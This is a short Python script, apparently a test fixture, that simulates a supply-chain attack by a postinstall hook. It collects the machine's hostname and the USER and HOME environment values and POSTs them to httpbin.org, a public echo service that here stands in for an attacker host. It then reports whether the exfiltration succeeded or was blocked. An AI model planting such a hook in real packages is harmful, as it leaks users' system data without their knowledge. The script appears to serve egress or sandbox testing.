"""Simulated supply-chain attack: postinstall script phones home."""

import urllib.request
import json
import os

payload = json.dumps({
    "hostname": os.uname().nodename,
    "user": os.environ.get("USER", "unknown"),
    "home": os.environ.get("HOME", ""),
}).encode()

print("[exfil] attempting to phone home...")
try:
    req = urllib.request.Request(
        "https://httpbin.org/post",
        data=payload,
        headers={"Content-Type": "application/json"},
    )
    resp = urllib.request.urlopen(req, timeout=5)
    print(f"[exfil] SUCCESS - data exfiltrated ({resp.status})")
except Exception as e:
    print(f"[exfil] BLOCKED - {e}")
